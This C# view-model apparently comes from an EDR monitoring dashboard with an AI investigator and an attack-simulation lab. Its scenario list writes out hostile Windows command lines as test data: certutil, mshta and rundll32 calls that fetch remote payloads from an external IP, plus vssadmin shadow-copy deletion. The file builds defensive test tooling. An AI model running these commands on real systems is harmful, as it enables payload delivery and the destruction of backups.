using System.Collections.ObjectModel;
using System.Windows;
using CommunityToolkit.Mvvm.ComponentModel;
using CommunityToolkit.Mvvm.Input;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Scenarios;
using Phalanx.Cockpit.Services;
using Phalanx.Cockpit.Storage;
using Phalanx.Shared.Protos;
using ActionType = Phalanx.Shared.Protos.MitigationCommand.Types.ActionType;

namespace Phalanx.Cockpit.ViewModels;

public enum CockpitViewType
{
    Incidents,
    Investigation,
    ProcessGraph
}

public record AttackScenarioItem(
    int Id,
    string Name,
    string Description,
    string ExpectedAction,
    string TargetProcess = "",
    string ParentProcess = "",
    string MitreTactic = "",
    string CommandLine = "",
    string AttackType = "",
    string ContextScenario = "",
    string DefenseGoal = "");

/// <summary>
/// Phalanx Enterprise EDR 메인 관제 콕핏 뷰모델
/// </summary>
public partial class MainViewModel : ObservableObject
{
    private readonly ForensicArchiveManager _archiveManager;
    private readonly ProcessTreeProjectionManager _treeManager;
    private readonly CockpitUiBridge _uiBridge;
    private readonly SensorProcessController _sensorController;
    private readonly AttackLabScenarioRunner _labRunner;
    private readonly List<ScenarioExecutionResult> _recentLabResults = new();

    [ObservableProperty]
    private CockpitViewType _currentView = CockpitViewType.Incidents;

    [ObservableProperty]
    private ProcessNodeModel? _selectedProcessNode;

    partial void OnSelectedProcessNodeChanged(ProcessNodeModel? value)
    {
        OnPropertyChanged(nameof(HasIncidentForSelectedProcess));
        OnPropertyChanged(nameof(SelectedProcessIncident));
    }

    public bool HasIncidentForSelectedProcess =>
        SelectedProcessNode != null && Incidents.Any(x => x.TargetPid == SelectedProcessNode.ProcessId);

    public IncidentItemViewModel? SelectedProcessIncident =>
        SelectedProcessNode != null ? Incidents.FirstOrDefault(x => x.TargetPid == SelectedProcessNode.ProcessId) : null;

    [ObservableProperty]
    private string _processSearchQuery = string.Empty;

    [ObservableProperty]
    private bool _hideTerminatedProcesses;

    partial void OnHideTerminatedProcessesChanged(bool value)
    {
        _treeManager.HideTerminated = value;
        _treeManager.RebuildVisibleNodes();
        OnPropertyChanged(nameof(VisibleProcesses));
    }

    public ObservableCollection<ProcessNodeModel> RootProcesses => _treeManager.RootNodes;

    public ObservableCollection<ProcessNodeModel> VisibleProcesses => _treeManager.VisibleNodes;

    [RelayCommand]
    private void ToggleExpand(ProcessNodeModel? node)
    {
        if (node != null)
        {
            _treeManager.ToggleNodeExpanded(node);
        }
    }

    public ObservableCollection<AttackScenarioItem> Scenarios { get; } = new()
    {
        new(
            1,
            "Office LOLBAS C2 Dropper",
            "winword.exe ➔ powershell.exe -enc <C2 다운로더> (선제 동결 ➔ AI 심층 수사 사살)",
            "ACTION_KILL",
            "powershell.exe",
            "winword.exe",
            "T1059.001",
            "powershell.exe -w hidden -enc JABjAGwAYQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOw...",
            "오피스 매크로 경유 C2 다운로더 (Living-off-the-Land)",
            "스피어 피싱 메일에 첨부된 Word 문서(.docm) 열람 시, 인라인 VBA 매크로가 백그라운드 숨김 창(-w hidden)으로 PowerShell을 기동하여 외부 C2 서버(185.220.101.5)에서 2차 페이로드를 다운로드하려는 침해 상황입니다.",
            "비인가 오피스 자식 프로세스를 선제 동결하고, 난독화된 명령줄을 해독하여 C2 통신을 확증한 뒤 프로세스를 격리 사살합니다."),

        new(
            2,
            "Ransomware Shadow Copy Deletion",
            "vssadmin.exe delete shadows /all /quiet (볼륨 섀도우 삭제 ➔ 즉각 현장 차단)",
            "ACTION_KILL",
            "vssadmin.exe",
            "cmd.exe",
            "T1490",
            "vssadmin.exe delete shadows /all /quiet",
            "랜섬웨어 복원 무력화 (볼륨 섀도우 복사본 일괄 영구 삭제)",
            "랜섬웨어가 호스트 시스템의 주요 파일을 암호화하기 직전, 피해자가 Windows 백업 복원 지점으로 롤백하지 못하도록 vssadmin 유틸리티를 호출하여 복원 지점을 일괄 삭제(/all /quiet)하려는 파괴적 침해 상황입니다.",
            "호스트 데이터 복원력을 보존하기 위해 파일이 암호화되기 전 커널 레벨에서 즉각 현장 사살(Reflex Kill)하여 복원 지점 삭제를 원천 차단합니다."),

        new(
            3,
            "LOLBAS CertUtil Remote Payload",
            "excel.exe ➔ certutil.exe -urlcache -split -f http://... (위협 평판 조회 ➔ 사살)",
            "ACTION_KILL",
            "certutil.exe",
            "excel.exe",
            "T1105",
            "certutil.exe -urlcache -split -f http://185.220.101.5/stage2.hta C:\\Windows\\Temp\\stage2.hta",
            "Windows 내장 인증서 유틸리티 악용 인그레스 페이로드 인출",
            "공격자가 백신 네트워크 다운로드 차단을 우회하기 위해, Microsoft 정품 인증서 관리 도구인 certutil.exe의 캐시 다운로드 기능(-urlcache -split -f)을 악용하여 외부 서버에서 악성 2차 페이로드를 받아오려는 상황입니다.",
            "정규 도구의 비정상 다운로드 행위를 포착하여 선제 동결한 후, 외부 IP 위협 평판 조회를 통해 악성 인출임을 확증하고 프로세스 사살 및 C2 IP를 방화벽에 차단합니다."),

        new(
            4,
            "Browser Drive-by HTA Attack",
            "msedge.exe ➔ mshta.exe http://... (MITRE ATT&CK T1218 분류 ➔ 사살)",
            "ACTION_KILL",
            "mshta.exe",
            "msedge.exe",
            "T1218.005",
            "mshta.exe http://185.220.101.5/calc.hta",
            "웹 브라우저 경유 악성 HTA 스크립트 실행 (Drive-by Execution)",
            "사용자가 악성 광고(Malvertising)나 피싱 웹페이지를 방문했을 때, 웹 브라우저가 사용자 개입 없이 Windows 내장 HTML 호스트인 mshta.exe를 분기하여 원격 서버의 HTA 페이로드를 직접 실행하려는 상황입니다.",
            "웹 브라우저가 스크립트 호스트를 스폰하는 이상 트리 계통을 동결하고, MITRE ATT&CK T1218.005 공격 기법으로 식별하여 브라우저 탈취 시도를 차단합니다."),

        new(
            5,
            "Masquerading Dropper (T1036.005)",
            "explorer.exe ➔ powershell.exe -enc ➔ Temp\\svchost.exe (심층 수사 ➔ 사살)",
            "ACTION_KILL",
            "svchost.exe",
            "powershell.exe",
            "T1036.005",
            "C:\\Users\\user\\AppData\\Local\\Temp\\svchost.exe -daemon",
            "시스템 핵심 프로세스명 위장 드로퍼 (Path Anomaly & Dropper)",
            "침투한 공격자가 정상 셸(explorer.exe)에서 파워셸을 이용해 Windows 핵심 프로세스인 svchost.exe와 동일한 이름으로 임시 폴더(C:\\Windows\\Temp\\)에 무서명 악성 바이너리를 생성하고 백그라운드 서비스로 상주하려는 상황입니다.",
            "정규 경로(System32)를 벗어난 시스템 바이너리 파일 생성을 감지하고, 위장 공격을 식별하여 악성 프로세스 사살 및 C2 방화벽 차단을 수행합니다."),

        new(
            6,
            "Benign Admin Script (Known-Good)",
            "explorer.exe ➔ powershell.exe -enc <Get-Service> (정상 관리 스크립트 ➔ 원자적 동결 해제)",
            "ACTION_RESUME",
            "powershell.exe",
            "explorer.exe",
            "Known-Good",
            "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
            "정상 관리자 유지보수 스크립트 (오탐 방지 및 정상 복구 검증)",
            "사내 전산 관리자 또는 정상 자동화 도구가 시스템 점검 및 서비스 가동 상태 확인(Get-Service)을 위해 파워셸 명령을 실행한 상황으로, 악의적 의도가 없는 합법적인 관리 작업입니다.",
            "스크립트 실행이 감지되더라도 명령줄 인자와 대상 작업이 무해한 읽기 전용 작업임을 AI 수사관이 정확히 판정하여 오탐 사살을 방지하고 정상 복구(ACTION_RESUME)를 집행합니다."),

        new(
            7,
            "SCCM Maintenance Script (False Positive Evasion)",
            "taskhostw.exe ➔ powershell.exe -enc <WMI Hotfix Audit> (사내 패치 점검 ➔ 무해성 검증 후 정상 복구)",
            "ACTION_RESUME",
            "powershell.exe",
            "taskhostw.exe",
            "Known-Good",
            "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc <Base64 WMI Hotfix Audit>",
            "사내 전산 관리자 정규 유지보수 및 핫픽스 감사 스크립트 (오탐 방지 검증)",
            "정규 시스템 작업 스케줄러(taskhostw.exe)가 관리자 권한으로 사내 패치 감사 스크립트를 Base64 인코딩으로 실행한 상황입니다. 명령줄 난독화가 존재하나 외부 C2 통신이 없고 사내 감사 로그(\\corp-sccm.internal)만 갱신하는 합법적 작업입니다.",
            "스크립트 실행이 감지되더라도 명령줄 인자와 대상 작업이 무해한 사내 감사 작업임을 AI 수사관이 정확히 판정하여 오탐 사살을 방지하고 정상 복구(ACTION_RESUME)를 집행합니다."),

        new(
            8,
            "Developer Toolchain Loopback IPC (Known-Good)",
            "code.exe ➔ curl.exe -s http://127.0.0.1:8080/health (로컬 개발 서버 헬스체크 ➔ 무해성 검증 후 정상 복구)",
            "ACTION_RESUME",
            "curl.exe",
            "code.exe",
            "Known-Good",
            "curl.exe -s http://127.0.0.1:8080/health -o C:\\Users\\user\\AppData\\Local\\Temp\\health.json",
            "개발자 IDE 환경 내 로컬 루프백 마이크로서비스 IPC 통신 (개발자 워크플로우 보존)",
            "개발자 도구인 VS Code가 로컬 웹 개발 서버 가동 상태를 확인하기 위해 명령어 셸을 거쳐 curl로 127.0.0.1 루프백 주소에 헬스체크 쿼리를 수행한 상황입니다.",
            "외부 네트워크 유출이 아닌 로컬 루프백(127.0.0.1) IPC 통신임을 AI 수사관이 식별하여 개발자 생산성을 저해하지 않고 즉시 원자적 동결을 해제(ACTION_RESUME)합니다."),

        new(
            9,
            "LOLBAS Rundll32 Proxy Execution (T1218.011)",
            "explorer.exe ➔ rundll32.exe javascript:... (파워셸 감시 회피 ➔ 위협 평판 ➔ 사살)",
            "ACTION_KILL",
            "rundll32.exe",
            "explorer.exe",
            "T1218.011",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://185.220.101.5/beacon.sct\")",
            "Windows 정품 서명 바이너리(Rundll32) 악용 C2 스크립트릿 인출",
            "공격자가 파워셸 감시 및 AMSI 스크립트 차단을 회피하기 위해, 정상 서명 바이너리인 rundll32.exe에 RunHTMLApplication을 호출하여 외부 악성 C2(185.220.101.5)로부터 원격 COM 스크립트릿(.sct)을 로드하려는 상황입니다.",
            "신뢰 바이너리를 악용한 우회 공격을 포착하여 선제 동결하고, 외부 C2 평판 조회 및 MITRE T1218.011 공격 기법으로 확증하여 즉각 사살 및 C2 방화벽 차단을 집행합니다."),

        new(
            10,
            "Process Injection via Unbacked Memory (T1055)",
            "spoolsv.exe (정상 명령줄 위장) ➔ VAD 인메모리 DLL 인젝션 (24μs 동결 ➔ VAD 스캔 ➔ 사살)",
            "ACTION_KILL",
            "spoolsv.exe",
            "services.exe",
            "T1055",
            "C:\\Windows\\System32\\spoolsv.exe",
            "정상 윈도우 인쇄 스풀러 프로세스 내 은닉 인메모리 DLL 인젝션",
            "명령줄과 디스크 바이너리는 완전히 정상적인 윈도우 시스템 서비스(spoolsv.exe)로 위장하고 있으나, 공격자가 가상 메모리 상에 비인가 실행 영역(PAGE_EXECUTE_READWRITE)을 주입하여 LockBit C2(194.165.16.11)로 백도어 통신을 시도하는 고난도 파일리스 침해 상황입니다.",
            "명령줄의 결백함에 속지 않고 VAD 메모리 스캔 도구를 통해 인메모리 Unbacked 실행 영역과 C2 IP를 현장 적발하여 프로세스를 격리 사살하고 침해를 원천 차단합니다."),

        new(
            CustomScenarioId,
            "커스텀 페이로드 공작소 (Ad-hoc)",
            "보안 연구원 정의 공격 파라미터 조합 및 동적 모의 침해 시험",
            "CUSTOM",
            "사용자 지정",
            "사용자 지정",
            "User Defined",
            "User Defined Command Line",
            "사용자 정의 모의 공격 페이로드",
            "보안 연구원 또는 침투 테스터가 직접 부모/타깃 프로세스, MITRE 전술, 실행 명령줄을 설계하여 Phalanx EDR의 탐지 및 자율 수사 능력을 시험하는 맞춤형 공작소입니다.",
            "임의의 공격 조합에 대해 EDR 파이프라인의 동결, 수사관 연동, 최종 처분 프로세스를 유연하게 검증합니다.")
    };

    public const int CustomScenarioId = 99;

    [ObservableProperty]
    private AttackScenarioItem? _selectedScenario;

    public bool IsCustomScenarioSelected => SelectedScenario?.Id == CustomScenarioId;
    public bool IsGoldenScenarioSelected => !IsCustomScenarioSelected;

    partial void OnSelectedScenarioChanged(AttackScenarioItem? value)
    {
        OnPropertyChanged(nameof(IsCustomScenarioSelected));
        OnPropertyChanged(nameof(IsGoldenScenarioSelected));
    }

    [ObservableProperty]
    private string _simulatorLog = "시나리오를 선택하여 [모의 침해 주입]을 실행하면 실시간 방어 검증 결과가 여기에 출력됩니다.";

    // =========================================================================
    // AttackLab Professional Workbench Observables
    // =========================================================================
    [ObservableProperty]
    private string _selectedLabMode = "grpc"; // "grpc", "os", "live"

    public bool IsModeGrpc => SelectedLabMode == "grpc";
    public bool IsModeOs => SelectedLabMode == "os";
    public bool IsModeLive => SelectedLabMode == "live";

    public AttackLabMode CurrentLabModeEnum => IsModeLive ? AttackLabMode.LiveExpert : (IsModeOs ? AttackLabMode.OsHybrid : AttackLabMode.CleanRoom);

    [ObservableProperty]
    private int _selectedLabTab = 0; // 0: Golden Scenarios, 1: Custom Studio

    public bool IsGoldenScenariosTab => SelectedLabTab == 0;
    public bool IsCustomStudioTab => SelectedLabTab == 1;

    [ObservableProperty]
    private bool _isArchitectureGuideVisible;

    // Custom Scenario Studio State
    [ObservableProperty]
    private string _customTargetImage = "powershell.exe";

    [ObservableProperty]
    private string _customParentImage = "explorer.exe";

    [ObservableProperty]
    private string _customCommandLine = "powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...";

    [ObservableProperty]
    private string _customMitreTactic = "T1059.001";

    [ObservableProperty]
    private string _customExpectedAction = "ACTION_KILL";

    [ObservableProperty]
    private bool _customIsSuspended = true;

    // Real-time Diagnostics Profiler State
    [ObservableProperty]
    private string _latestVerdictStatus = "READY"; // READY, PASS, BENIGN, FAIL, IN_PROGRESS

    [ObservableProperty]
    private string _latestScenarioName = "대기 중 (시나리오 미실행)";

    [ObservableProperty]
    private string _latestLatencyText = "0 ms";

    [ObservableProperty]
    private string _latestTurnCountText = "-";

    [ObservableProperty]
    private string _latestToolsText = "호출 대기 중";

    [ObservableProperty]
    private string _latestConfidenceText = "-";

    [ObservableProperty]
    private string _latestAssertionText = "시나리오를 선택하여 [모의 침해 주입]을 실행하면 실시간 방어 정합성 및 SLA 평가가 수행됩니다.";

    [ObservableProperty]
    private bool _sensorConnected;

    [ObservableProperty]
    private bool _isSensorRunning;

    public string SensorToggleText => (SensorConnected || IsSensorRunning) ? "STOP SENSOR" : "START SENSOR";

    [ObservableProperty]
    private int _monitoredProcessCount;

    [ObservableProperty]
    private int _activeSuspendedCount;

    [ObservableProperty]
    private int _totalTerminatedCount;

    [ObservableProperty]
    private int _activeRestoredCount;

    public int TotalRestoredCount
    {
        get => ActiveRestoredCount;
        set => ActiveRestoredCount = value;
    }

    partial void OnActiveRestoredCountChanged(int value) => OnPropertyChanged(nameof(TotalRestoredCount));

    [ObservableProperty]
    private string _activeFilter = "ALL"; // ALL, CRITICAL, BENIGN, SUSPENDED

    [ObservableProperty]
    private string _searchQuery = string.Empty;

    [ObservableProperty]
    private IncidentItemViewModel? _selectedIncident;

    public ObservableCollection<IncidentItemViewModel> Incidents { get; } = new();
    public ObservableCollection<IncidentItemViewModel> FilteredIncidents { get; } = new();

    public SettingsViewModel Settings { get; }

    private System.Windows.Threading.DispatcherTimer? _investigationTimer;

    public MainViewModel(
        ForensicArchiveManager archiveManager,
        ProcessTreeProjectionManager treeManager,
        CockpitUiBridge uiBridge,
        SensorProcessController sensorController,
        AttackLabScenarioRunner labRunner,
        SettingsViewModel? settings = null)
    {
        _archiveManager = archiveManager;
        _treeManager = treeManager;
        _uiBridge = uiBridge;
        _sensorController = sensorController;
        _labRunner = labRunner;
        Settings = settings ?? new SettingsViewModel(null, archiveManager, uiBridge, sensorController);

        // UI 브리지 및 센서 제어 이벤트 구독
        _uiBridge.SensorConnectionChanged += OnSensorConnectionChanged;
        _uiBridge.ProcessCountUpdated += OnProcessCountUpdated;
        _uiBridge.InvestigationStarted += OnInvestigationStarted;
        _uiBridge.ReActStepCompleted += OnReActStepCompleted;
        _uiBridge.InvestigationCompleted += OnInvestigationCompleted;
        _uiBridge.IncidentsDatabaseCleared += LoadIncidentsFromDatabase;
        _treeManager.OnProcessStopped += HandleProcessStopped;

        _sensorController.SensorStateChanged += state =>
        {
            IsSensorRunning = state;
            OnPropertyChanged(nameof(SensorToggleText));
        };
        IsSensorRunning = _sensorController.IsSensorRunning;

        // DB로부터 과거 사건 웜업
        LoadIncidentsFromDatabase();

        // C++ 센서 연결 전이라도 로컬 PC 프로세스 트리를 즉시 0초 투영 (오프라인 기본 가시성 확보)
        _treeManager.InitializeFromLocalOsSnapshot();
        MonitoredProcessCount = _treeManager.ActiveCount;

        // 어택랩 기본 시나리오 선택
        SelectedScenario = Scenarios.FirstOrDefault();

        // C++ 커널 센서 기동 시도 (UI 표시 후 UAC 비동기 요청)
        _ = AutoStartSensorAsync();
    }

    public MainViewModel(
        ForensicArchiveManager archiveManager,
        ProcessTreeProjectionManager treeManager,
        CockpitUiBridge uiBridge,
        SensorProcessController? sensorController = null)
        : this(archiveManager, treeManager, uiBridge,
               sensorController ?? SensorProcessController.Instance,
               new AttackLabScenarioRunner(treeManager, null),
               null)
    {
    }

    private void OnSensorConnectionChanged(bool isConnected)
    {
        SensorConnected = isConnected;
        OnPropertyChanged(nameof(SensorToggleText));
    }

    private void OnProcessCountUpdated(int count)
    {
        MonitoredProcessCount = count;
    }

    private void HandleProcessStopped(ProcessNodeModel node, bool wasSuspended, bool wasRestored)
    {
        void Update()
        {
            if (wasRestored && ActiveRestoredCount > 0)
            {
                ActiveRestoredCount--;
            }
            if (wasSuspended && ActiveSuspendedCount > 0)
            {
                ActiveSuspendedCount--;
            }
            MonitoredProcessCount = _treeManager.ActiveCount;
        }

        var app = Application.Current;
        if (app?.Dispatcher != null && !app.Dispatcher.CheckAccess() && app.Dispatcher.Thread.IsAlive && !app.Dispatcher.HasShutdownStarted)
        {
            _ = app.Dispatcher.InvokeAsync(Update);
        }
        else
        {
            Update();
        }
    }

    private void OnInvestigationStarted(ProcessNodeModel targetNode, string incidentId)
    {
        if (targetNode.IsRestored && ActiveRestoredCount > 0)
        {
            ActiveRestoredCount--;
        }
        targetNode.IsRestored = false;
        ActiveSuspendedCount++;

        string parentImg = _treeManager.FindActiveNodeByPid(targetNode.ParentProcessId)?.ImageName ?? "System";

        var item = new IncidentItemViewModel
        {
            IncidentId = incidentId,
            Timestamp = DateTime.UtcNow,
            TargetPid = targetNode.ProcessId,
            TargetImage = targetNode.ImageName,
            CommandLine = targetNode.CommandLine,
            ParentPid = targetNode.ParentProcessId,
            ParentImage = parentImg,
            VerdictAction = "SUSPENDED",
            StatusSeverity = "SUSPENDED",
            SummaryTitle = "AI 자율 수사관 심층 조사 진행 중 (Process Frozen)...",
            Narrative = "원자적 프로세스 동결 완료. AI 자율 수사관이 메모리 VAD 및 명령줄 난독화 해독을 조사 중입니다.",
            IsInvestigating = true,
            InvestigationProgressText = "원자적 동결 완료. AI 심층 수사 착수...",
            ActiveElapsedSeconds = 0.0
        };

        Incidents.Insert(0, item);
        ApplyFilter();

        // 새로 수사 시작된 항목을 기본 선택
        SelectedIncident = item;
        StartInvestigationTimer();
    }

    private void OnReActStepCompleted(string incidentId, ReActTraceRecord trace)
    {
        var existing = Incidents.FirstOrDefault(x => x.IncidentId == incidentId);
        if (existing == null) return;

        // 기존 턴 아코디언은 접고, 신규 생성 턴을 펼침
        foreach (var t in existing.Traces)
        {
            t.IsExpanded = false;
        }

        var stepVm = new ReActStepViewModel
        {
            StepNumber = trace.StepNumber,
            ActionTool = trace.ActionTool,
            Thought = trace.Thought,
            ActionArgsJson = trace.ActionArgsJson,
            Observation = trace.Observation,
            ElapsedMs = trace.ElapsedMs,
            IsExpanded = true
        };
        existing.Traces.Add(stepVm);

        existing.InvestigationProgressText = trace.ActionTool.Equals("None", StringComparison.OrdinalIgnoreCase)
            ? "최종 판결 및 포렌식 서사 종합 중..."
            : $"Turn {trace.StepNumber} • {trace.ActionTool} 완료";
    }

    private void OnInvestigationCompleted(InvestigationResult result)
    {
        if (ActiveSuspendedCount > 0)
        {
            ActiveSuspendedCount--;
        }

        bool isKill = result.VerdictAction == ActionType.ActionKill;
        var targetNode = result.Record?.TargetPid is uint pid ? _treeManager.FindNodeByPid(pid) : null;

        if (isKill)
        {
            if (targetNode != null)
            {
                targetNode.IsRestored = false;
            }
            TotalTerminatedCount++;
        }
        else
        {
            if (targetNode != null)
            {
                targetNode.IsRestored = true;
            }
            ActiveRestoredCount++;
        }

        var record = result.Record;
        if (record == null) return;

        // 기존 대기 중 카드 갱신 또는 신규 삽입
        var existing = Incidents.FirstOrDefault(x => x.IncidentId == record.IncidentId || x.TargetPid == record.TargetPid);
        if (existing == null)
        {
            existing = new IncidentItemViewModel();
            Incidents.Insert(0, existing);
        }

        existing.IncidentId = record.IncidentId;
        existing.Timestamp = record.Timestamp;
        existing.TargetPid = record.TargetPid;
        existing.TargetImage = record.TargetImage;
        existing.CommandLine = record.CommandLine;
        existing.ParentImage = record.RootCauseProcess;
        existing.VerdictAction = result.VerdictAction.ToString();
        existing.StatusSeverity = isKill ? "CRITICAL" : "BENIGN";
        existing.ConfidenceScore = result.Confidence;
        existing.SummaryTitle = result.SummaryTitle;
        existing.Narrative = result.Narrative;
        existing.BlockedIp = result.BlockedIp ?? string.Empty;
        existing.ElapsedMs = result.Elapsed.TotalMilliseconds;
        existing.IsInvestigating = false;
        existing.InvestigationProgressText = string.Empty;

        // 다중 수사 안전 가드: 타 수사 건이 없으면 틱 타이머 정지
        if (!Incidents.Any(x => x.IsInvestigating && x.IncidentId != record.IncidentId))
        {
            _investigationTimer?.Stop();
        }

        existing.MitreTactics.Clear();
        foreach (var t in result.MitreTactics)
        {
            existing.MitreTactics.Add(t);
        }

        existing.RemediationSteps.Clear();
        foreach (var r in record.RemediationSteps)
        {
            existing.RemediationSteps.Add(r);
        }

        // 아코디언 상태 보존: Traces.Clear() 대신 실시간 미수신 누락분만 보충 추가
        for (int i = existing.Traces.Count; i < result.Traces.Count; i++)
        {
            var tr = result.Traces[i];
            existing.Traces.Add(new ReActStepViewModel
            {
                StepNumber = tr.StepNumber,
                ActionTool = tr.ActionTool,
                Thought = tr.Thought,
                ActionArgsJson = tr.ActionArgsJson,
                Observation = tr.Observation,
                ElapsedMs = tr.ElapsedMs,
                IsExpanded = (i == result.Traces.Count - 1)
            });
        }

        if (existing.Traces.Count > 0 && !existing.Traces.Any(t => t.IsExpanded))
        {
            existing.Traces[^1].IsExpanded = true;
        }

        ApplyFilter();
        SelectedIncident = existing;
        OnPropertyChanged(nameof(SelectedIncident));
    }

    private void StartInvestigationTimer()
    {
        if (Application.Current != null)
        {
            if (_investigationTimer == null)
            {
                _investigationTimer = new System.Windows.Threading.DispatcherTimer
                {
                    Interval = TimeSpan.FromMilliseconds(100)
                };
                _investigationTimer.Tick += OnInvestigationTimerTick;
            }
            if (!_investigationTimer.IsEnabled)
            {
                _investigationTimer.Start();
            }
        }
    }

    private void OnInvestigationTimerTick(object? sender, EventArgs e)
    {
        var now = DateTime.UtcNow;
        bool anyActive = false;
        foreach (var inc in Incidents)
        {
            if (inc.IsInvestigating)
            {
                anyActive = true;
                inc.ActiveElapsedSeconds = (now - inc.Timestamp).TotalSeconds;
            }
        }
        if (!anyActive)
        {
            _investigationTimer?.Stop();
        }
    }

    public void LoadIncidentsFromDatabase()
    {
        try
        {
            var dbIncidents = _archiveManager.GetAllIncidents();
            Incidents.Clear();

            int kills = 0;
            int resumes = 0;

            foreach (var rec in dbIncidents)
            {
                bool isKill = rec.VerdictAction == "ACTION_KILL";
                if (isKill) kills++; else resumes++;

                var item = new IncidentItemViewModel
                {
                    IncidentId = rec.IncidentId ?? string.Empty,
                    Timestamp = rec.Timestamp,
                    TargetPid = rec.TargetPid,
                    TargetImage = rec.TargetImage ?? string.Empty,
                    CommandLine = rec.CommandLine ?? string.Empty,
                    VerdictAction = rec.VerdictAction ?? string.Empty,
                    StatusSeverity = isKill ? "CRITICAL" : "BENIGN",
                    ConfidenceScore = rec.ConfidenceScore,
                    SummaryTitle = rec.SummaryTitle ?? string.Empty,
                    Narrative = rec.Narrative ?? string.Empty,
                    BlockedIp = rec.BlockedIp ?? string.Empty,
                    ParentImage = rec.RootCauseProcess ?? string.Empty
                };

                foreach (var m in rec.MitreTactics)
                {
                    item.MitreTactics.Add(m);
                }

                foreach (var r in rec.RemediationSteps)
                {
                    item.RemediationSteps.Add(r);
                }

                var traces = _archiveManager.GetTracesForIncident(rec.IncidentId ?? string.Empty);
                foreach (var tr in traces)
                {
                    item.Traces.Add(new ReActStepViewModel
                    {
                        StepNumber = tr.StepNumber,
                        ActionTool = tr.ActionTool,
                        Thought = tr.Thought,
                        ActionArgsJson = tr.ActionArgsJson,
                        Observation = tr.Observation,
                        ElapsedMs = tr.ElapsedMs
                    });
                }

                double traceElapsed = traces.Sum(t => t.ElapsedMs);
                item.ElapsedMs = rec.ElapsedMs > 0 ? rec.ElapsedMs : (traceElapsed > 0 ? traceElapsed : 0.08);
                Incidents.Add(item);
            }

            TotalTerminatedCount = kills;
            // Gauge 모델 원칙: ActiveRestoredCount는 현재 살아있는 프로세스의 실시간 복원 상태 수치이므로 과거 DB 사건 수로 덮어쓰지 않고 0으로 시작
            ApplyFilter();

            if (FilteredIncidents.Count > 0 && SelectedIncident == null)
            {
                SelectedIncident = FilteredIncidents[0];
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[DB Warmup Error] {ex.Message}");
        }
    }

    [RelayCommand]
    private void SetFilter(string filter)
    {
        ActiveFilter = filter;
        ApplyFilter();
    }

    [RelayCommand]
    private void SelectIncident(IncidentItemViewModel? incident)
    {
        SelectedIncident = incident;
    }

    [RelayCommand]
    private void CloseInspector()
    {
        SelectedIncident = null;
    }

    [RelayCommand]
    private async Task ToggleSensorAsync()
    {
        if (SensorConnected || IsSensorRunning)
        {
            await _sensorController.StopSensorAsync();
        }
        else
        {
            await _sensorController.StartSensorAsync();
        }
    }

    private async Task AutoStartSensorAsync()
    {
        // 단위 테스트 환경 또는 헤드리스 실행 시 UAC 팝업 및 센서 자동 기동 방지
        if (System.Windows.Application.Current == null ||
            AppDomain.CurrentDomain.FriendlyName.Contains("test", StringComparison.OrdinalIgnoreCase) ||
            AppDomain.CurrentDomain.GetAssemblies().Any(a => a.GetName().Name?.Contains("xunit", StringComparison.OrdinalIgnoreCase) == true))
        {
            return;
        }

        // UI가 완전히 로드된 후 자연스럽게 UAC 승격 팝업을 띄우기 위해 짧은 딜레이 부여
        await Task.Delay(500);
        if (!SensorConnected && !IsSensorRunning)
        {
            await _sensorController.StartSensorAsync();
        }
    }

    [RelayCommand]
    private void RefreshFromDb()
    {
        LoadIncidentsFromDatabase();
    }

    partial void OnSearchQueryChanged(string value)
    {
        ApplyFilter();
    }

    private void ApplyFilter()
    {
        var previousSelected = SelectedIncident;
        FilteredIncidents.Clear();
        foreach (var item in Incidents)
        {
            bool matchesCategory = ActiveFilter switch
            {
                "CRITICAL" => item.StatusSeverity == "CRITICAL",
                "BENIGN" => item.StatusSeverity == "BENIGN",
                "SUSPENDED" => item.StatusSeverity == "SUSPENDED",
                _ => true
            };

            if (!matchesCategory) continue;

            if (!string.IsNullOrWhiteSpace(SearchQuery))
            {
                bool matchesSearch = (item.TargetImage?.Contains(SearchQuery, StringComparison.OrdinalIgnoreCase) ?? false) ||
                                     (item.CommandLine?.Contains(SearchQuery, StringComparison.OrdinalIgnoreCase) ?? false) ||
                                     item.TargetPid.ToString().Contains(SearchQuery) ||
                                     (item.SummaryTitle?.Contains(SearchQuery, StringComparison.OrdinalIgnoreCase) ?? false) ||
                                     (item.BlockedIp?.Contains(SearchQuery, StringComparison.OrdinalIgnoreCase) ?? false);
                if (!matchesSearch) continue;
            }

            FilteredIncidents.Add(item);
        }

        if (previousSelected != null && FilteredIncidents.Contains(previousSelected))
        {
            SelectedIncident = previousSelected;
        }
    }

    [RelayCommand]
    private void SwitchView(string viewName)
    {
        if (Enum.TryParse<CockpitViewType>(viewName, true, out var parsed))
        {
            CurrentView = parsed;
        }
    }

    [RelayCommand]
    private void OpenInvestigation(IncidentItemViewModel? incident)
    {
        if (incident != null)
        {
            SelectedIncident = incident;
        }
        CurrentView = CockpitViewType.Investigation;
    }

    [RelayCommand]
    private void ReturnToIncidents()
    {
        CurrentView = CockpitViewType.Incidents;
    }

    private System.Windows.Window? _attackLabWindow;

    [RelayCommand]
    private void OpenAttackLab()
    {
        if (_attackLabWindow != null && _attackLabWindow.IsLoaded)
        {
            if (_attackLabWindow.WindowState == System.Windows.WindowState.Minimized)
            {
                _attackLabWindow.WindowState = System.Windows.WindowState.Normal;
            }
            _attackLabWindow.Activate();
            return;
        }

        _attackLabWindow = new Views.AttackLabWindow
        {
            DataContext = this
        };
        _attackLabWindow.Closed += (s, e) => _attackLabWindow = null;
        _attackLabWindow.Show();
    }

    private System.Windows.Window? _settingsWindow;

    [RelayCommand]
    private void OpenSettings()
    {
        if (_settingsWindow != null && _settingsWindow.IsLoaded)
        {
            if (_settingsWindow.WindowState == System.Windows.WindowState.Minimized)
            {
                _settingsWindow.WindowState = System.Windows.WindowState.Normal;
            }
            _settingsWindow.Activate();
            return;
        }

        Settings.LoadCurrentSettings();
        _settingsWindow = new Views.SettingsWindow
        {
            DataContext = Settings,
            Owner = System.Windows.Application.Current?.MainWindow
        };
        _settingsWindow.Closed += (s, e) => _settingsWindow = null;
        _settingsWindow.Show();
    }

